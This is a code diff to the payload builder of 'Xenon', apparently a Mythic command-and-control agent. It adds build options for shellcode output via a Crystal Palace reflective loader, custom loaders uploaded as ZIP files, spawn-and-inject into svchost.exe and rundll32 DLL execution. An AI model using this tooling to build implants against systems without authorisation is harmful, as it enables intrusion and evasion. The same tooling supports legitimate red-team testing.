@@ -1,4 +1,4 @@
-import logging, json, toml, os, random
+import logging, json, toml, os, random, zipfile
 import traceback
 import pathlib
 from mythic_container.PayloadBuilder import *
@@ -25,37 +25,57 @@ class XenonAgent(PayloadType):
     translation_container = "XenonTranslator"
     build_parameters = [
         BuildParameter(
+            name = "debug",
+            parameter_type=BuildParameterType.Boolean,
+            default_value="false",
+            description="Debug: Enable debugging console and symbols in payload."
+        ),
+        BuildParameter(
             name = "output_type",
             parameter_type=BuildParameterType.ChooseOne,
             choices=[ "exe", "dll", "shellcode"],
             default_value="exe",
-            description="Output type: shellcode, dynamic link library, executable",
-        ),
-        BuildParameter(
-            name = "debug",
-            parameter_type=BuildParameterType.Boolean,
-            default_value="false",
-            description="Debug: Includes debugging console and symbols in agent. Don't use for real",
-        ),
-        BuildParameter(
-            name = "dll_export_function",
-            parameter_type=BuildParameterType.String,
-            default_value="DllRegisterServer",
-            description="Dll Export Function: The name of the exported function when using the DLL payload type. (e.g., rundll32.exe xenon.dll,MyExportFunction)",
-        ),
-        BuildParameter(
-            name = "spawnto_process",
-            parameter_type=BuildParameterType.String,
-            default_value="svchost.exe",
-            description="Spawnto Process: Process name to use for spawn & inject commands.",
+            description="Output type: shellcode, dynamic link library, executable"
         ),
         BuildParameter(
             name = "default_pipename",
             parameter_type=BuildParameterType.String,
             default_value="xenon",
-            description="Default Pipe Name: Value of the named pipe to use for spawn & inject commands.",
+            description="Default Pipe Name: Value of the named pipe to use for spawn & inject commands. (e.g., execute_assembly)"
+        ),
+        BuildParameter(
+            name = "spawnto_process",
+            parameter_type=BuildParameterType.String,
+            default_value="svchost.exe",
+            description="Spawnto Process: Process name to use for spawn & inject commands. Must be in C:\\Windows\\System32\\"
+        ),
+        BuildParameter(
+            name = "dll_export_function",
+            parameter_type=BuildParameterType.String,
+            default_value="DllRegisterServer",
+            description="Dll Export Function: Used for Dll execution with rundll32. (e.g., rundll32.exe xenon.dll,DllRegisterServer)",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="dll")
+            ]
+        ),
+        BuildParameter(
+            name = "custom_udrl",
+            parameter_type=BuildParameterType.Boolean,
+            default_value="false",
+            description="User-Defined Reflective Loader: Define your own RDL for agent execution. Must be based on Crystal Palace - See docs for details.",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="shellcode")
+            ]
+        ),
+        BuildParameter(
+            name = "udrl_file",
+            parameter_type=BuildParameterType.File,
+            # default_value="xenon",
+            description="Crystal UDRL: ZIP or TAR must follow specified format - See docs for details.",
+            hide_conditions=[
+                HideCondition(name="custom_udrl", operand=HideConditionOperand.NotEQ, value=True)
+            ]
         )
-        
     ]
     agent_path = pathlib.Path(".") / "xenon" / "mythic"
     # agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
@@ -479,14 +499,23 @@ class XenonAgent(PayloadType):
                 else:
                     command = "make exe"
                     output_path = f"{agent_build_path.name}/artifact_x64.exe"
-            # Dll or Shellcode
-            elif self.get_parameter('output_type') == 'dll' or self.get_parameter('output_type') == 'shellcode':
+            # Dll
+            elif self.get_parameter('output_type') == 'dll':
                 if self.get_parameter('debug') == True:
                     command = "make debug_dll"
                     output_path = f"{agent_build_path.name}/artifact_x64-debug.dll"
                 else:
                     command = "make dll"
                     output_path = f"{agent_build_path.name}/artifact_x64.dll"
+            # Shellcode
+            elif self.get_parameter('output_type') == 'shellcode':
+                if self.get_parameter('debug') == True:
+                    command = "make debug_shellcode"
+                    output_path = f"{agent_build_path.name}/artifact_x64-debug.sc.dll"
+                else:
+                    command = "make shellcode"
+                    output_path = f"{agent_build_path.name}/artifact_x64.sc.dll"
+            
             
             # Make command
             proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
@@ -504,12 +533,76 @@ class XenonAgent(PayloadType):
                 logging.info(f"[+] Compiled agent written to {output_path}")
             
             
-            # If shellcode, run donut on the Dll above
+            # For Shellcode, link with Crystal Palace loader
             if self.get_parameter('output_type') == 'shellcode':
-                bin_file = f"{agent_build_path.name}/loader.bin"
-                # Use donut-shellcode here
-                export_function = self.get_parameter('dll_export_function')
-                donut.create(file=output_path, output=bin_file, arch=3, bypass=1, method=export_function)
+                
+                # Use Custom UDRL
+                if self.get_parameter('custom_udrl') == True:
+                    custom_udrl_path = os.path.join(agent_build_path.name, "Loader", "custom")            # agent_code/Loader/custom
+                    zip_path = os.path.join(agent_build_path.name, "Loader", "custom", "loader.zip")      # agent_code/Loader/custom/loader.zip
+                    
+                    os.makedirs(custom_udrl_path, exist_ok=True)
+                                        
+                    udrl_bundle_file_id = self.get_parameter('udrl_file')
+                    logging.info(f"UDRL File ID: {udrl_bundle_file_id}")
+                    # Get zip data and write to disk
+                    udrl_bundle_contents = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=udrl_bundle_file_id)
+                    )
+                    with open(zip_path, "wb") as f:
+                        f.seek(0)
+                        f.write(udrl_bundle_contents.Content)
+                        f.truncate()
+                    # Unzip
+                    with zipfile.ZipFile(zip_path, 'r') as z:
+                        z.extractall(custom_udrl_path)
+                    
+                    udrl_path = custom_udrl_path
+                # Use Default Loader
+                else:
+                    udrl_path = agent_build_path.name + "/Loader/udrl"
+                
+                # Compile UDRL Object
+                command = "make"
+                
+                proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=udrl_path)
+                stdout, stderr = await proc.communicate()
+                stdout_err = ""
+                if proc.returncode != 0:
+                    build_success = False
+                    logging.error(f"Command failed with exit code {proc.returncode}")
+                    logging.error(f"[stderr]: {stderr.decode()}")
+                    stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
+                else:
+                    logging.info(f"[stdout]: {stdout.decode()}")
+                    stdout_err += f'\n[stdout]\n{stdout.decode()}\n'
+
+                    logging.info(f"[+] Compiled UDRL written to {udrl_path}")
+                
+                # Link with Crystal Palace
+                bin_file = f"{agent_build_path.name}/out.x64.bin"
+                command = f"./link {udrl_path}/loader.spec {output_path} {bin_file}"
+                crystal_palace_path = agent_build_path.name + "/Loader/dist"
+                
+                proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=crystal_palace_path)
+                stdout, stderr = await proc.communicate()
+                stdout_err = ""
+                if proc.returncode != 0:
+                    build_success = False
+                    logging.error(f"Command failed with exit code {proc.returncode}")
+                    logging.error(f"[stderr]: {stderr.decode()}")
+                    stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
+                else:
+                    logging.info(f"[stdout]: {stdout.decode()}")
+                    stdout_err += f'\n[stdout]\n{stdout.decode()}\n'
+
+                    logging.info(f"[+] Linker converted DLL to PIC written to {bin_file}")
+                
+                
+                # bin_file = f"{agent_build_path.name}/loader.bin"
+                # # Use donut-shellcode here
+                # export_function = self.get_parameter('dll_export_function')
+                # donut.create(file=output_path, output=bin_file, arch=3, bypass=1, method=export_function)
    
                 if os.path.exists(bin_file):
                     # Shellcode is new output file path
